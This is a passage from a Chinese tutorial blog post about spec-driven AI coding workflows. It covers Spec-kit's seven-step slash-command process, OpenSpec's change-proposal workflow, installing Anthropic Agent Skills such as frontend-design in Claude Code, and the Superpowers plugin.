文件夹：</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">文件夹里面包含了这些核心文件：</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>.specify/memory/constitution.md</code><span class=\"md-plain\">：项目的基本准则和约定</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>.specify/scripts/</code><span class=\"md-plain\">：一些可执行脚本</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>.specify/templates/</code><span class=\"md-plain\">：模板文件</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>.claude/commands/</code><span class=\"md-plain\">：定义了一套内置的斜杠命令，让你在 AI 编程工具中可以直接调用</span></span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">初始化程序还给了我们一些指引，告诉我们接下来如何运用这些命令来开发项目。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">用 Claude Code 打开这个项目文件夹，就可以在对话中使用定义好的命令了。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">接下来就是标准化的开发流程，参考 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/github/spec-kit\" rel=\"noopener nofollow\"><span class=\"md-plain\">官方文档</span></a><span class=\"md-plain\">，主要分为 7 个步骤：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">1）Constitution 制定项目准则</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/speckit.constitution</code><span class=\"md-plain\"> 命令，定义项目的基本原则、代码规范、性能标准等。这是项目的 “宪法”，后续所有开发都要遵守。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">比如：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/speckit.constitution 禁止使用蓝紫渐变色风格的 UI</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">💡 如果你要做中文项目，最好在制定项目准则时就明确告诉 AI “整个网站使用中文”。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">AI 更新了项目准则文档：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">建议每一步我们都用 Git 提交一个版本，这样出了问题后能及时回滚，也便于我们看到每一步改动的文件。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">2）Specify 编写功能规范</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/speckit.specify</code><span class=\"md-plain\"> 命令，描述要做什么功能、为什么做、用户需求是什么。比如：</span></span></span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/speckit.specify 我想做个【自动提醒我喝水的网站】</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">AI 为这次的需求创建了一个新的 Git 分支，防止污染现有项目。在这个分支下创建了一个需求规格文档（spec.md） + 一个需求检查文档（requirements.md）。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">需求规格文档非常详细，还包含了边缘测试用例，针对用户各种可能的操作进行处理。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">需求检查文档中记录了 AI 对于需求的理解，打钩表示 AI 理解并确认了：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">3）Clarify 澄清不明确的地方（可选）</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">如果你发现需求检查文档中有的条目没有打钩，那你需要通过 Clarify 命令来让 AI 引导你进一步明确需求，直到所有的条目都打上勾。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/speckit.clarify</code><span class=\"md-plain\"> 命令，AI 会提出结构化的问题，让你来回答。从而帮你填补需求中的空白，比如边界情况、错误处理等。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我运气不错，不需要这一步 AI 就已经理解了所有条目，接下来可以进入制定技术方案阶段。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">4）Plan 制定技术方案</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/speckit.plan</code><span class=\"md-plain\"> 命令，让 AI 决定用什么技术栈、系统架构、数据模型、API 接口等。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">制定技术方案完成，这次生成了一大堆文档，简单了解一下：</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">CLAUDE.md 项目开发指南，记录技术栈和项目结构，用于指导 Claude Code 接下来如何开发</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">quickstart.md 快速入门指南，包含 6 个实施阶段和部署方案</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">plan.md 实施方案，定义了纯客户端架构、存储策略、宪法合规性检查等</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">data-model.md 数据模型设计，定义了 4 个核心实体（提醒设置、水量日志、每日进度、历史记录）和存储结构</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">research.md 技术研究文档，记录了 8 项关键技术决策</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">contracts/api-contract.md API 接口文档</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">接下来，我们就可以准备开发实现了。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">5）Tasks 拆解任务</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/speckit.tasks</code><span class=\"md-plain\"> 命令，把计划拆解成可执行的任务列表，并标注依赖关系和优先级。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">生成了一个任务列表文档，每一步要做什么都非常清晰：</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">6）Analyze 分析检查（可选）</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/speckit.analyze</code><span class=\"md-plain\"> 命令，检查规范、计划、任务是否完整一致，提前发现设计缺陷。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">可以看到，AI 没有检查出问题，还让我自信地进行下一步，真爽死了！</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">7）Implement 执行实现</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">最后，运行 <span class=\"md-pair-s\"><code>/speckit.implement</code><span class=\"md-plain\"> 命令，让 AI 按照任务列表生成代码。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">大功告成，看一下效果~</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">因为我这里始终没有提到使用中文输出，所以网站内容都是英文的，不过我感觉效果还可以。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">到这里，我们已经学会了如何用 Spec-kit 开发完整项目，再复习一下完整流程：</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">即使不用 Spec-kit，我们开发完整项目时也可以人工遵循这些步骤。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这种模式最大的好处是 <span class=\"md-pair-s \"><strong>对齐</strong><span class=\"md-plain\">。所有人都基于同一份清晰的规范文档工作，大家对需求的理解高度一致，既减少了沟通中的误解，又能确保代码质量。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">不过缺点也很明显，对于小项目，本来直接写代码几分钟就能搞定了，上面这套流程走下来差不多要半个小时！</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">所以这套流程比较适合团队从 0 开始做完整的新项目，虽然流程比直接写代码慢一些，但能大大降低返工的风险，长远来看反而更高效。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">OpenSpec 轻量规范框架</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://openspec.dev/\" rel=\"noopener nofollow\"><span class=\"md-plain\">OpenSpec</span></a><span class=\"md-plain\"> 是一个轻量的规范驱动开发框架，比 Spec-kit 更简单易用。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它的核心理念是把规范文档作为代码库的一部分，每次改功能都 <span class=\"md-pair-s \"><strong>先写变更提案</strong><span class=\"md-plain\"> =&gt; 确认后再实现 =&gt; 实现完再把变更归档到规范文档中，让文档和代码始终保持同步。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">访问 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/Fission-AI/OpenSpec/\" rel=\"noopener nofollow\"><span class=\"md-plain\">OpenSpec 官方仓库</span></a><span class=\"md-plain\"> 查看文档。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先确保你的电脑安装了符合要求的 Node.js 版本（比如我这里要求 Node.js &gt;= 20.19.0），然后全局安装 OpenSpec CLI：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span><span class=\"cm-builtin\">npm&nbsp;install&nbsp;<span class=\"cm-attribute\">-g&nbsp;@fission-ai/openspec@latest</span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">进入你的项目目录，运行初始化命令：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>openspec init</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">初始化过程中会让你选择要集成的 AI 工具（比如 Claude Code、Cursor 等），我这里选择 Cursor。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行命令后，OpenSpec 会自动在你的项目中生成一个 <span class=\"md-pair-s\"><code>openspec/</code><span class=\"md-plain\"> 目录，里面包含：</span></span></span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>openspec/specs/</code><span class=\"md-plain\">：存放主规范文档，记录了项目的完整现状</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>openspec/changes/</code><span class=\"md-plain\">：存放变更提案，记录了每次修改的计划</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">⭐️ <span class=\"md-pair-s\"><code>openspec/AGENTS.md</code><span class=\"md-plain\">：让 AI 编程助手使用 OpenSpec 进行规范驱动开发的操作指南，包含了如何创建变更提案、编写需求规范、验证和归档变更的完整工作流程。</span></span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>openspec/project.md</code><span class=\"md-plain\">：当前项目的上下文说明（用来记录项目的信息）</span></span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">此外，还会根据你选择的 AI 编程工具，生成对应的命令文件，比如 Cursor 的：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了这些文件，我们就可以开始规范化的开发流程了。参考 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/Fission-AI/OpenSpec/\" rel=\"noopener nofollow\"><span class=\"md-plain\">官方文档</span></a><span class=\"md-plain\">，主要分为 5 个步骤：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">1）Draft 起草变更提案</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">直接在 AI 编程工具中跟 AI 说，让它创建变更提案。比如我想添加用户搜索功能：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>创建一个 OpenSpec 的 change，添加功能：根据名称和邮箱搜索用户</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">也可以用 AI 编程工具（比如 Claude Code、Cursor）的斜杠命令：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/openspec:proposal 添加功能：根据名称和邮箱搜索用户</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">AI 会给这个功能创建一个独立的目录 <span class=\"md-pair-s\"><code>openspec/changes/add-user-search/</code><span class=\"md-plain\">，目录下创建一系列文档：</span></span></span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>proposal.md</code><span class=\"md-plain\">：描述要改什么、为什么改</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>tasks.md</code><span class=\"md-plain\">：实施步骤的任务分解</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>specs/…/spec.md</code><span class=\"md-plain\">：需求变更的具体内容</span></span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">2）Verify &amp; Review 验证和审查</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">可以运行下列命令，查看 AI 创建的变更提案是否正确：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>openspec list &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-comment\"># 查看所有变更<br /><span>openspec validate add-user-search &nbsp; &nbsp;<span class=\"cm-comment\"># 验证格式是否正确<br /><span>openspec show add-user-search &nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-comment\"># 查看详细内容</span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">3）和团队一起审查提案</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">如果需要完善，可以继续跟 AI 对话，比如：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>你能帮我添加更多搜索条件和限制么？</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">AI 会更新规范和任务列表，直到大家达成一致。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">4）Implement 实现变更</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">规范确认后，让 AI 开始实现：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>规范已经很完美了，开始生成代码吧</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">也可以用斜杠命令：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/openspec:apply add-user-search</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">AI 会按照 <span class=\"md-pair-s\"><code>tasks.md</code><span class=\"md-plain\"> 中的任务列表逐一实现，并标记完成状态。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">很快生成完成，AI 的输出非常整齐，所有改动一目了然：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">5）Archive 归档变更</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">所有任务完成后，让 AI 归档这次变更：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>请归档这次变更</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">也可以用斜杠命令：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/openspec:archive add-user-search</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">或者在终端运行：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>openspec archive add-user-search&nbsp;<span class=\"cm-attribute\">--yes</span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这个命令会：</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">将变更文件夹移动到 <span class=\"md-pair-s\"><code>openspec/changes/archive/</code><span class=\"md-plain\"> 归档区</span></span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">将需求变更自动合并到 <span class=\"md-pair-s\"><code>openspec/specs/</code><span class=\"md-plain\"> 主规范中</span></span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">保持文档和代码的同步</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这样一来，通过 <span class=\"md-pair-s\"><code>openspec/changes/</code><span class=\"md-plain\"> 的历史记录，你可以随时追溯每次变更的来龙去脉。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">此外，整个开发过程中，建议大家定期运行 <span class=\"md-pair-s\"><code>openspec validate</code><span class=\"md-plain\"> 验证命令， 确保规范的完整性。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<div class=\"md-hr md-end-block\"><hr /></div>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">到这里，相信大家也能感受到 OpenSpec 和 Spec-kit 的区别了。</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">Spec-kit 需要完整的 7 步流程：制定准则 → 写需求 → 澄清疑问 → 定方案 → 拆任务 → 检查 → 写代码），适合从 0 开始做大型新项目</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">OpenSpec 的流程更简化：起草提案 → 审查 → 实现 → 归档 → 验证，上手更快，适合在现有项目上迭代功能。</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">⭐️ Agent Skills 通用 AI 技能库</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://claude.com/blog/skills\" rel=\"noopener nofollow\"><span class=\"md-plain\">Agent Skills</span></a><span class=\"md-plain\"> 是 Anthropic 新推出的 AI 技能系统。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它定义了一种 <span class=\"md-pair-s \"><strong>封装 AI 工作流</strong><span class=\"md-plain\"> 的标准：开发者可以把复杂的任务指令、脚本和资源打包成一个 <span class=\"md-pair-s \"><strong>技能（Skill）</strong><span class=\"md-plain\">；作为用户，你只需要安装这些技能，AI 就能立刻学会这项本事，不用重复造轮子。</span></span></span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">让我们来实战一下，利用 <span class=\"md-meta-i-c  md-link\"><a href=\"https://www.claudeskill.site/en/skills/anthropic-agent-skills:frontend-design\" rel=\"noopener nofollow\"><span class=\"md-plain\">frontend-design</span></a><span class=\"md-plain\"> 这个 Agent Skills 来优化生成网站的界面。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">1）安装 Agent Skills</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先打开 Claude Code，输入一行命令，把官方提供的 Skills 注册为插件市场：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/plugin marketplace add anthropics/skills</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后输入 <span class=\"md-pair-s\"><code>/plugin</code><span class=\"md-plain\">，通过 Tab 键切换到 Marketplaces 界面，批量安装官方提供的 Skills。包括：</span></span></span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">document-skills：文档技能包，可以处理 Excel、Word、PPT、PDF 等文档。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">example-skills：示例技能包 ，可以处理技能创建、构建 MCP、视觉设计、算法艺术、网页测试、动图制作、主题样式等。</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">安装好之后，输入 <span class=\"md-pair-s\"><code>/skills</code><span class=\"md-plain\"> 命令，就能看到所有已经安装完成的技能了，我们要的 <span class=\"md-pair-s\"><code>frontend-design</code><span class=\"md-plain\"> 也在其中。</span></span></span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">可以在本地找到 Skills 的安装位置，你会发现，SKills 的本质就是一组封装好的提示词文档 + 脚本文件等：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">还有另外一种安装方式，也可以在 Claude Code 中输入一行命令来安装 <span class=\"md-meta-i-c  md-link\"><a href=\"https://www.claudeskill.site/en/skills/anthropic-agent-skills:frontend-design\" rel=\"noopener nofollow\"><span class=\"md-plain\">frontend-design</span></a><span class=\"md-plain\"> 技能。</span></span></span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>skill install anthropic-agent-skills:frontend-design</span></pre>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">2）安装完 SKills 后，你只需要和之前一样跟 AI 对话，程序会自动根据你的任务选择使用什么 Skills。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">比如我让 AI 开发一个精美的狼人杀网页游戏，它会询问我是否要使用 <span class=\"md-pair-s\"><code>frontend-design</code><span class=\"md-plain\"> 技能。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用这个技能后，AI 会选择独特的设计风格，生成的界面既有个性又专业，告别千篇一律的蓝紫渐变色。而且不需要你每次都重复输入一堆设计要求，非常方便！</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">不用技能是这样的，对比一下：</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">目前 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/anthropics/skills\" rel=\"noopener nofollow\"><span class=\"md-plain\">Anthropic 官方技能仓库</span></a><span class=\"md-plain\"> 已经提供了丰富的技能集合，涵盖编程相关的数据库优化、API 安全、测试策略、代码审查、文档生成，还有办公相关的 PPT 制作、Excel 处理、Word 文档、PDF 生成等各个方面。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">如果官方提供的技能不够用，你还可以上传自定义技能，或者访问 <span class=\"md-meta-i-c  md-link\"><a href=\"https://www.claudeskill.site/\" rel=\"noopener nofollow\"><span class=\"md-plain\">Claude Skills Hub</span></a><span class=\"md-plain\"> 下载社区贡献的技能。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">值得一提的是，Agent Skills 现已成为 <span class=\"md-meta-i-c  md-link\"><a href=\"https://agentskills.io/\" rel=\"noopener nofollow\"><span class=\"md-plain\">通用标准</span></a><span class=\"md-plain\">。除了 Claude，<span class=\"md-meta-i-c  md-link\"><a href=\"https://cursor.com/docs/context/skills\" rel=\"noopener nofollow\"><span class=\"md-plain\">Cursor</span></a><span class=\"md-plain\"> 等主流 AI 编程工具也会陆续提供支持。也就是说，你在一个工具里用的技能，在另一个工具里也能复用。</span></span></span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Superpowers 核心技能库</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/obra/superpowers\" rel=\"noopener nofollow\"><span class=\"md-plain\">Superpowers</span></a><span class=\"md-plain\"> 是一套让 AI 编程助手变得更专业的 <span class=\"md-pair-s \"><strong>软件开发流程</strong><span class=\"md-plain\">。它不仅为 Claude Code 提供了一套可组合的 <span class=\"md-pair-s \"><strong>编程技能包</strong><span class=\"md-plain\">，还提供了规范和指令，确保 AI 能够正确使用这些技能。</span></span></span></span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">传统的 AI 编程，你一说需求它就开始噼里啪啦地写，结果可能并不是你想要的。而装了 Superpowers 之后，AI 会先问清楚你到底想做什么，然后出设计方案让你确认，接着制定详细的执行计划，最后才分步骤去实现，每一步还会自我检查。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">就像给一个刚进公司啥都不懂的 AI 加上了超能力，瞬间让它有了专业程序员的开发习惯。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">参考 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/obra/superpowers\" rel=\"noopener nofollow\"><span class=\"md-plain\">Superpowers 官方文档</span></a><span class=\"md-plain\">，在 Claude Code 中运行以下命令安装。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">先注册市场：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/plugin marketplace add obra/superpowers-marketplace</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">再从市场安装插件：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>/plugin install superpowers@superpowers-marketplace</span></pre>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">安装后运行 <span class=\"md-pair-s\"><code>/help</code><span class=\"md-plain\"> 查看可用命令，你会看到这 3 